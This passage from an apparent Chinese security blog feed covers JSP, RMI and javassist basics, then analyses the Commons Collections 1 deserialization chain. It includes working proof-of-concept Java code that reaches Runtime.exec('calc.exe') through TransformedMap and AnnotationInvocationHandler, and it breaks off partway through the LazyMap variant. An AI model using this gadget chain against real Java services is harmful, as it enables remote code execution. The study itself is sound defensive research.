file&#x3D;&quot;文件相对url地址&quot; %&gt; 表示要包含哪些其他文件，可以包含JSP,HTML或txt等文件</span><br><span class="line"></span><br><span class="line">&lt;%@ taglib ......%&gt;  主要用于用户自定义标签 </span><br></pre></td></tr></table></figure><h4 id="动作元素"><a href="#动作元素" class="headerlink" title="动作元素"></a>动作元素</h4><p>与指令元素比较相似，但不同的是动作元素可以动态的插入，不像指令元素一样一开头就会被执行。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152132.png" alt="QQ截图20210219152132"></p><h4 id="九大对象"><a href="#九大对象" class="headerlink" title="九大对象"></a>九大对象</h4><p>JSP中有九大对象用于实现各种操作。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152143.png" alt="QQ截图20210219152143"></p><p>至于request和response，这俩用的是最多的是他们，<br>out对象主要用于在response中写入输出内容， out.println或者out.print用于输出内容，out.flush用于刷新输出流,其余在新手阶段都不咋用。</p><h4 id="传参处理"><a href="#传参处理" class="headerlink" title="传参处理"></a>传参处理</h4><ul><li><strong>getParameter():</strong> 使用 request.getParameter() 方法来获取表单参数的值。</li><li><strong>getParameterValues():</strong> 获得如checkbox类（名字相同，但值有多个）的数据。 接收数组变量 ，如checkbox类型</li><li>**getParameterNames():**该方法可以取得所有变量的名称，该方法返回一个 Enumeration。</li><li>**getInputStream():**调用此方法来读取来自客户端的二进制数据流。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;test jsp&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">your name is &lt;%&#x3D;request.getParameter(&quot;name&quot;)%&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152207.png" alt="QQ截图20210219152207"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152242.png" alt="QQ截图20210219152242"></p><h3 id="cookie-amp-session-1"><a href="#cookie-amp-session-1" class="headerlink" title="cookie&amp;session"></a>cookie&amp;session</h3><h4 id="cookie，session在JSP里的设置与servlet如出一辙"><a href="#cookie，session在JSP里的设置与servlet如出一辙" class="headerlink" title="cookie，session在JSP里的设置与servlet如出一辙"></a>cookie，session在JSP里的设置与servlet如出一辙</h4><p>cookie和session在jsp的&lt;%%&gt;代码区里设置，设置方法与servlet如出一辙，因为&lt;%%&gt;代码区里本身就是调用的java代码，所以不再赘述</p><h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="何为RMI"><a href="#何为RMI" class="headerlink" title="何为RMI"></a>何为RMI</h2><p>RMI，即远程方法调用，允许运行在一个JAVA虚拟机调用另一个JAVA虚拟机上的对象的方法.</p><h2 id="RMI-实现一个远程接口"><a href="#RMI-实现一个远程接口" class="headerlink" title="RMI:实现一个远程接口"></a>RMI:实现一个远程接口</h2><p>RMI的远程接口用于其他java虚拟机远程调用该接口下的对象的方法.</p><h3 id="定义一个远程接口"><a href="#定义一个远程接口" class="headerlink" title="定义一个远程接口"></a>定义一个远程接口</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.Remote;   &#x2F;&#x2F;引入Remote接口</span><br><span class="line">public interface IHello extends Remote&#123;  &#x2F;&#x2F;实现一个Remote接口</span><br><span class="line">  public String sayHello(String name) throws java.rmi.RemoteException;</span><br><span class="line">&#x2F;&#x2F;若是Remote接口里某个方法抛出RemoteException异常,就意味着这是一个可以被远程调用的方法,但目前这个方法还未被具体实现.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="远程接口的实现类"><a href="#远程接口的实现类" class="headerlink" title="远程接口的实现类"></a>远程接口的实现类</h3><p>刚刚我们定义了一个Remote接口,但是他的方法还未具体实现.我们就来实现远程接口的实现类吧</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">public class HelloImpl extends UnicastRemoteObject implements IHello&#123; &#x2F;&#x2F;定义一个远程接口实现类,注意这个远程实现类必须继承自UnicastRemoteObject,不然服务端不会发送该类的对象的存根(stub(下文讲))</span><br><span class="line">    protected HelloImpl throws RemoteException&#123;&#x2F;&#x2F;必须要有一个抛出RemoteException异常的显示构造函数</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line">    public String sayHello(String name) throws RemoteException&#123;</span><br><span class="line">        return &quot;Hello&quot;+name;    &#x2F;&#x2F;定义实现类方法的具体代码</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="两台JVM通讯的第一步-RMI-Registry"><a href="#两台JVM通讯的第一步-RMI-Registry" class="headerlink" title="两台JVM通讯的第一步:RMI Registry"></a>两台JVM通讯的第一步:RMI Registry</h2><p>何为RMI Registry<br>可以理解为部署在被远程调用的JAVA虚拟机上的一个应用,用于将stub绑定到Registry服务的URL上。</p><p>服务端绑定stub到指定url</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.rmi.Naming.rebind(&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;hello&quot;, hello);   </span><br><span class="line">&#x2F;&#x2F;如此处就是把hello这个对象绑定在了rmi:&#x2F;&#x2F;localhost:1099&#x2F;hello这个URL</span><br></pre></td></tr></table></figure><p>随后客户端想要远程调用hello这个对象的方法时，就需</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IHello hello &#x3D; (IHello) Naming.lookup(&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;hello&quot;);</span><br><span class="line">&#x2F;&#x2F;此刻客户端查找出了hello对象的stub所在url,服务端返回hello对象的Stub</span><br><span class="line">&#x2F;&#x2F;此时的数据类型似乎必须是接口类</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152319.png" alt="QQ截图20210219152319"></p><h2 id="Stub和Skeleton"><a href="#Stub和Skeleton" class="headerlink" title="Stub和Skeleton"></a>Stub和Skeleton</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152334.png" alt="QQ截图20210219152334"></p><p>由上文可知当客户机远程调用一个对象时,返回的其实不是对象本身,而是stub.<br>你可以理解stub为一个中继站，当客户机调用该对象某个方法时,实际上是通过stub以socket的方式向服务器端的skeleton发送序列化处理的方法名和参数（skeleton可以理解为服务器端上的真实对象)<br>服务端的skeletion反序列化得到的方法名和参数并处理后再以socket的方式把该方法生成的结果传回stub,stub再把数据返回给客户机</p><h2 id="代码实现远程调用"><a href="#代码实现远程调用" class="headerlink" title="代码实现远程调用"></a>代码实现远程调用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务器端</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.*;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">interface Hello extends Remote&#123;</span><br><span class="line">    public String sayHello(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HelloImpl extends UnicastRemoteObject implements Hello&#123;</span><br><span class="line">    protected HelloImpl()throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line">    public String sayHello(String name) throws RemoteException&#123;</span><br><span class="line">        return &quot;Hello&quot;+name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">public class Server&#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">    try&#123;&#x2F;&#x2F;必须有try..catch</span><br><span class="line">        Hello hello &#x3D; new HelloImpl();  &#x2F;&#x2F;似乎数据类型只能是接口类</span><br><span class="line">        LocateRegistry.createRegistry(1080);  &#x2F;&#x2F;将RMI registry的端口设置为1080</span><br><span class="line">        java.rmi.Naming.rebind(&quot;rmi:&#x2F;&#x2F;localhost:1080&#x2F;hello&quot;, hello);&#x2F;&#x2F;</span><br><span class="line">将hello这个方法对象绑定在指定url上,rmi协议</span><br><span class="line">        System.out.print(&quot;OK&quot;);</span><br><span class="line">    &#125;catch(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">客户机端</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.*;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">public class Client&#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try&#123;&#x2F;&#x2F;必须有try..catch</span><br><span class="line">        Hello hello_client &#x3D; (Hello) Naming.lookup(&quot;rmi:&#x2F;&#x2F;localhost:1080&#x2F;hello&quot;);  &#x2F;&#x2F;服务器端绑定在该url的对象数据类型是Hello，所以这里的数据类型也是Hello</span><br><span class="line">        System.out.print(hello_client.sayHello(&quot;fuck&quot;));</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152343.png" alt="QQ截图20210219152343"></p><h1 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h1><p>javassist 是一个类库，用于操作java字节码。</p><p>比如我们接下来就会使用javassist来动态操作字节码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test2.java</span><br><span class="line">public class test2 &#123;</span><br><span class="line">    public void gogo()&#123;</span><br><span class="line">        System.out.println(&quot;yuansheng&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test1.java</span><br><span class="line">import javassist.*;</span><br><span class="line">public class test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">        CtClass class1 &#x3D; pool.get(test2.class.getName());</span><br><span class="line">        String cmd &#x3D; &quot;System.out.print(\&quot;hello\&quot;);&quot;;</span><br><span class="line">        class1.makeClassInitializer().insertBefore(cmd);  \\插入static静态代码块，内容为cmd中内容</span><br><span class="line">        class1.setName(&quot;class1&quot;);  \\为新类命名为class1</span><br><span class="line">        class1.writeFile(&quot;d:\\test&quot;);  \\将类写入d:\\test文件夹</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反编译d:\\test\\class1.class</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">&#x2F;&#x2F; (powered by FernFlower decompiler)</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">public class class1 &#123;</span><br><span class="line">    public class1() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void gogo() &#123;</span><br><span class="line">        System.out.println(&quot;yuansheng&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        System.out.print(&quot;hello&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现我们已经往test2.java的内容中插入了输出hello的静态代码块，并以class1.class写入d:\\test文件夹。</p><p>javassist的功能除此之外还有很多</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java-代理&quot;&gt;&lt;a href=&quot;#java-代理&quot; class=&quot;headerlink&quot; title=&quot;java 代理&quot;&gt;&lt;/a&gt;java 代理&lt;/h1&gt;&lt;p&gt;代理的作用，就是在原有类的代码不发生改动的情况下，添加新功能。起到一个修饰器的作用。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Apache-Commons-Collections1 反序列化分析</title>
    <link href="http://const27.com/2021/06/28/Apache-Commons-Collections1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>http://const27.com/2021/06/28/Apache-Commons-Collections1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</id>
    <published>2021-06-28T13:51:11.039Z</published>
    <updated>2021-06-28T13:47:27.546Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Transformer-Map-链"><a href="#Transformer-Map-链" class="headerlink" title="Transformer Map 链"></a>Transformer Map 链</h2><h3 id="RCE原理"><a href="#RCE原理" class="headerlink" title="RCE原理"></a>RCE原理</h3><p>我在网上找到了一则利用代码，虽然这个利用代码很粗浅，并没有CC链1的触发过程，但是对于这条链的原理还是可见一斑的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,</span><br><span class="line">                        new Object[]</span><br><span class="line">                                &#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain &#x3D; new</span><br><span class="line">                ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap &#x3D; new HashMap();</span><br><span class="line">        Map outerMap &#x3D; TransformedMap.decorate(innerMap, null,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="TransformerMap类"><a href="#TransformerMap类" class="headerlink" title="TransformerMap类"></a>TransformerMap类</h4><p>TransformerMap类是造成这个漏洞的原因之一</p><p>TransformerMap是apacheCommonsCollections里提供的一个数据类型。它可以修饰一个Map类型的对象。当修饰过的Map添加新元素时，它会调用在decorate里声明好的Trasnformer类的transform方法并传入新添的键名或值名。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Map DecoratedMap &#x3D; TransformedMap.decorate（Map,keyTransformer,</span><br><span class="line">valueTransformer）</span><br></pre></td></tr></table></figure><p>keyTransformer和valueTransformer分别指向不同的Transformer类。</p><h4 id="Transformer类"><a href="#Transformer类" class="headerlink" title="Transformer类"></a>Transformer类</h4><p>我们看一下Transformer类</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150055.png" alt="QQ截图20210217150055"></p><p>可以发现它只是一个借口，他的方法需要其他子类实现。<br>当TransformerMap在新添元素时就会调用decorate里设定好的Transformer类的transform方法。<br>它的接口实现类有以下几个。</p><h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h5><p>这个类主要的两个方法就是这俩了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line">        this.iConstant &#x3D; constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        return this.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>没什么好说的，就是把传入的对象原原本本返回。</p><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>也是两个重要方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iMethodName &#x3D; methodName;</span><br><span class="line">        this.iParamTypes &#x3D; paramTypes;</span><br><span class="line">        this.iArgs &#x3D; args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        if (input &#x3D;&#x3D; null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Class cls &#x3D; input.getClass();</span><br><span class="line">                Method method &#x3D; cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">                return method.invoke(input, this.iArgs);</span><br><span class="line">            &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);</span><br><span class="line">            &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);</span><br><span class="line">            &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是传入方法名，参数类型和参数，然后通过反射来执行这个方法</p><h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p>也是两个重要方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">     this.iTransformers &#x3D; transformers;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> public Object transform(Object object) &#123;</span><br><span class="line">     for(int i &#x3D; 0; i &lt; this.iTransformers.length; ++i) &#123;</span><br><span class="line">         object &#x3D; this.iTransformers[i].transform(object);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     return object;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>就是把传入的多个Transfomer类的transformer方法依次执行，每个transformer方法执行后返回的对象会被当做下一次执行的时候传入的参数。</p><p>通过以上信息，我们就可以清晰的看懂上面的payload了。<br>先通过ConstantTransformer获得 Runtime类，再通过InvokerTransformer执行exec方法，然后通过ChainedTransformer将两个类串起来，让InvokerTransformer以ConstantTrasformer返回的Runtime类为参数执行exec方法，达到RCE的目的。</p><h3 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h3><p>触发，我们选择的地方是sun.reflect.annotation.AnnotationInvocationHandler的readObject方法，反序列化的入口点基本都在这里：readobjcect方法。（注意8u71以下才能有触发点，之后的版本已被修复）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150130.png" alt="QQ截图20210217150130"></p><p>触发点代码。<br>我们可以发现，它对传入的map的每一个value执行了setValue。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150142.png" alt="QQ截图20210217150142"></p><p>可以很明显的发现会对值进行transform方法。也就是相当于触发了一次Map.put()。接下来，就是payload构造时间了。</p><p>但是 AnnotationInvocationHandler 是内部类无法直接实例化，但它的父类InvocationHandler可以，我们可以通过反射得到 AnnotationInvocationHandler 构造方法，然后对其使用newInstance再向上转型为父类 InvocationHandler 。既然要获得对象，我们就应该关注一下它的构造方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 &#x3D; var1.getInterfaces();</span><br><span class="line">    if (var1.isAnnotation() &amp;&amp; var3.length &#x3D;&#x3D; 1 &amp;&amp; var3[0] &#x3D;&#x3D; Annotation.class) &#123;</span><br><span class="line">        this.type &#x3D; var1;</span><br><span class="line">        this.memberValues &#x3D; var2;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要传入两个参数，var2不用说了就是我们传入的Map，var1呢？是Annotation类，即所有注释类的接口。我们必须在此处传入一个注释类才能使if判断为真，才能把我们的参数中的Map传入。<br>但是并不是所有注释类传进去都有效，注释类（实际上就是接口）必须有定义的方法才能正常触发反序列化。关于此点我们后面再详细谈谈。</p><p>因为再readObject方法里我们会执行**Map var3 = var2.memberTypes()**，我们看看memberTypes源码。</p><p>发现是返回构造方法中定义好的memberTypes属性。而这个memberTypes属性又和上一行的var2属性有关，var2属性又与getDecalredMethods有关…因此我才猜测 “注释类必须有定义的方法才能正常触发反序列化 “,但实际结果确实如此。<br>目前找到的能够正常触发漏洞的注释类有 Target Retention SuppressWarnings .无一例外他们作为接口都定义了方法。而且在我翻阅一些参考文档后，发现确实是这样</p><p>另外一点需要注明的是，Runtime类没有继承Serialize接口，也就是说它不能被直接序列化。<br>也就是说如果我们在transformer链里想直接通过有*<em>new ConstantTransformer(Runtime.\</em>getRuntime*())**来获取Runtime对象时，会反序列化失败。<br>但是Class类是有继承Serialize接口的，我们可以通过transformer链和反射来在反序列化阶段逐步创建Runtime类，继而解决这个问题</p><p>总结一下几个坑点：<br>1.Runtime类不能被序列化<br>\2. AnnotationInvocationHandler 无法直接实例化，可通过反射获得对象<br>3.注意在实例化 AnnotationInvocationHandler 时要传入定义好方法的注释类<br>OK，以上知道了后就能试着写一下payload了（这个payload依旧不能正常执行，错误出处间代码注释，具体原因看下文）。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.*;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.*;</span><br><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.*;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">public class test2 &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;new String(&quot;getRuntime&quot;),new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;new String(&quot;calc.exe&quot;)&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            ChainedTransformer chain &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">            Map innermap &#x3D; new HashMap();</span><br><span class="line">            innermap.put(&quot;sc&quot;,&quot;b&quot;);  &#x2F;&#x2F;不能执行的原因在这里，如果是put(&quot;value&quot;,&quot;a&quot;)就可以正常执行</span><br><span class="line">            Map outmap &#x3D; TransformedMap.decorate(innermap,null,chain);</span><br><span class="line"></span><br><span class="line">            Class Annotation &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor AnnotationCons &#x3D; Annotation.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            AnnotationCons.setAccessible(true);</span><br><span class="line">            InvocationHandler InvocationHandler &#x3D; (InvocationHandler) AnnotationCons.newInstance(Target.class,outmap);</span><br><span class="line"></span><br><span class="line">            ObjectOutputStream a &#x3D; new ObjectOutputStream(new FileOutputStream(new File(&quot;a.bin&quot;)));</span><br><span class="line">            a.writeObject(InvocationHandler);</span><br><span class="line">            a.close();</span><br><span class="line">            ObjectInputStream b &#x3D; new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;));</span><br><span class="line">            b.readObject();</span><br><span class="line">            b.close();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么不能执行，这原因与上面提到的“ 注意在实例化 AnnotationInvocationHandler 时要传入定义好方法的注释类 ”很有关联。<br>因为涉及JVM的一些东西，我们不会怎么去深究，就是浅浅的看一下，做出一些推测。</p><p>首先我们关注到 AnnotationInvocationHandler 的readObject。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150215.png" alt="QQ截图20210217150215"></p><p>接下来就是复杂的推理了，建议先把各方法的意义弄明白<br>发现必须要var7！=null才能正常触发反序列化漏洞，那么var7的来源是从(Map)var3中获得以(String)var6为键名的值。var6是var3中一项的键名。而var3的来源是(Annotation)var2的menberTypes,我们跟进这个方法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150244.png" alt="QQ截图20210217150244"></p><p>那么var1就是AnnotationInvocationHandler的type属性了，而这个type属性在其构造方法中就定义好了，是传入的注释类。<br>也就是说var1就是我们在实例 AnnotationInvocationHandler 时传入的注释类。<br>结合以上流程，我们就可以知道这个过程是:<br>从 实例 AnnotationInvocationHandler 时传入的注释类 中获取最后一个方法，然后把它编入为一个HashMap(以下称为注释方法Map)的一个键名并给予值。在readObject时会遍历传入的Map，如果在传入的Map中找到了一项的键名在注释方法Map中存在（即 在传入的Map中找到了一项的键名与实例化时传入的注释类的最后一个方法同名），则if条件为真，攻击成功。<br>所以上面为什么put(“value”,任意)才能达成攻击的原因是， Target Retention SuppressWarnings 这三个注释类都有且只有一个方法名为value的方法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150343.png" alt="QQ截图20210217150343"></p><p>分析完了。这个洞利用版本只能在8u71以前，比较古老无用。</p><h2 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h2><h3 id="RCE原理-1"><a href="#RCE原理-1" class="headerlink" title="RCE原理"></a>RCE原理</h3><p>LazyMap的获得方法和TransfromerMap差不多。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    Map innerMap &#x3D; new HashMap();</span><br><span class="line">    Map outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">public Object get(Object key) &#123;</span><br><span class="line">    if (!super.map.containsKey(key)) &#123;</span><br><span class="line">        Object value &#x3D; this.factory.transform(key);</span><br><span class="line">        super.map.put(key, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return super.map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在对LazyMap使用get方法时，它会执行this.factory.transform(key),而this.factory.transform如果去跟进分析的话，实质上就是调用我们在decorate传进去的Transformer类。</p><h3 id="触发-1"><a href="#触发-1" class="headerlink" title="触发"></a>触发</h3><p>LazyMap的触发点也在 AnnotationInvocationHandler 中，但不是在readObject方法，而是在invoke方法。invoke方法中有一行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Object var6 &#x3D; this.memberValues.get(var4);</span><br></pre></td></tr></table></figure><p>其中this.memberVales是在构造方法中定义为传入的Map。</p><p>那么invoke方法要怎么才能触发呢？答案是动态代理。<br>熟悉动态代理的朋友肯定直到，invoke方法时动态代理中的一个特殊的方法，在代理类中无论执行什么方法，实质上都是在执行invoke方法。</p><p>那么接下来就是骚思路了：<br>我们通过反射和向上转型得到一个 <strong>AnnotationInvocationHandler(Class var1, Map var2)</strong> 对象。<br>构建一个Map的代理类，其第三个参数是刚刚得到的 <strong>AnnotationInvocationHandler</strong> 对象，再故技重施将其通过向上转型得到一个 <strong>AnnotationInvocationHandler</strong> 对象。当该对象反序列化执行readObjct方法时，会执行一下entryset方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150359.png" alt="QQ截图20210217150359"></p><p>本质上来说，是对一个代理类执行了一下entrySet方法，即执行了代理类的invoke方法，又因为代理类的第三个参数填入的是 <strong>AnnotationInvocationHandler</strong> 对象，其内部已经写好了invoke方法，所以此处执行的代理类的invoke方法即 <strong>AnnotationInvocationHandler</strong> 